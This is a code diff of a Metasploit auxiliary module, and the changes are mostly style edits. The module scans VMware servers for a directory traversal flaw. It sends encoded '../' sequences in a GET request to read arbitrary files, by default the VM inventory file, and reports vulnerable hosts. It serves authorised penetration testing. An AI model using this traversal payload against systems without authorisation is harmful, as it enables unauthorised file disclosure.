@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,7 +7,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   # Exploit mixins should be called first
   include Msf::Exploit::Remote::HttpClient
   # Scanner mixin should be near last
@@ -22,7 +22,7 @@ class MetasploitModule < Msf::Auxiliary
         allows remote attackers to read arbitrary files. Common VMware server ports
         80/8222 and 443/8333 SSL.  If you want to download the entire VM, check out
         the gueststealer tool.',
-      'Author'      => 'CG' ,
+      'Author'      => 'CG',
       'License'     => MSF_LICENSE,
       'References'	=>
         [
@@ -37,20 +37,20 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RPORT(8222),
         OptString.new('FILE', [ true,  "The file to view", '/etc/vmware/hostd/vmInventory.xml']),
-        OptString.new('TRAV', [ true,  "Traversal Depth", '/sdk/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E']),
-      ], self.class)
+        OptString.new('TRAV', [ true,  "Traversal Depth", '/sdk/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E'])
+      ], self.class
+    )
   end
 
   def run_host(target_host)
-
     begin
       file = datastore['FILE']
       trav = datastore['TRAV']
       res = send_request_raw({
-        'uri'          => trav+file,
-        'version'      => '1.1',
-        'method'       => 'GET'
-      }, 25)
+                               'uri' => trav + file,
+                               'version'      => '1.1',
+                               'method'       => 'GET'
+                             }, 25)
 
       if res.nil?
         print_error("Connection timed out")
@@ -58,18 +58,16 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       if res.code == 200
-        #print_status("Output Of Requested File:\n#{res.body}")
+        # print_status("Output Of Requested File:\n#{res.body}")
         print_status("#{target_host}:#{rport} appears vulnerable to VMWare Directory Traversal Vulnerability")
         report_vuln(
-          {
-            :host   => target_host,
-            :port	=> rport,
-            :proto  => 'tcp',
-            :name	=> self.name,
-            :info   => "Module #{self.fullname} reports directory traversal of #{target_host}:#{rport} with response code #{res.code}",
-            :refs   => self.references,
-            :exploited_at => Time.now.utc
-          }
+          host: target_host,
+          port: rport,
+          proto: 'tcp',
+          name: name,
+          info: "Module #{fullname} reports directory traversal of #{target_host}:#{rport} with response code #{res.code}",
+          refs: references,
+          exploited_at: Time.now.utc
         )
       else
         vprint_status("Received #{res.code} for #{trav}#{file}")
@@ -80,5 +78,4 @@ class MetasploitModule < Msf::Auxiliary
     rescue ::Timeout::Error, ::Errno::EPIPE
     end
   end
-
 end
